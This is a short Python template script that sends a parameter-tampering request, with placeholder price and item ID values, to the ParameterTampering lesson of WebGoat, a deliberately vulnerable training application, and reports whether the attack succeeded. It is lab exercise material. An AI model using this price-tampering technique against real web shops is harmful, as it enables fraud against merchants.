import requests

webgoat_url = "http://__HOST_IP__:8080/WebGoat/ParameterTampering/attack"
payload = {
    "price": "__PRICE__",
    "item_id": "__ITEM_ID__"
}

response = requests.post(webgoat_url, data=payload)
if response.status_code == 200:
    print("[+] Parameter tampering successful!")
else:
    print(f"[-] Attack failed. HTTP Status Code: {response.status_code}")

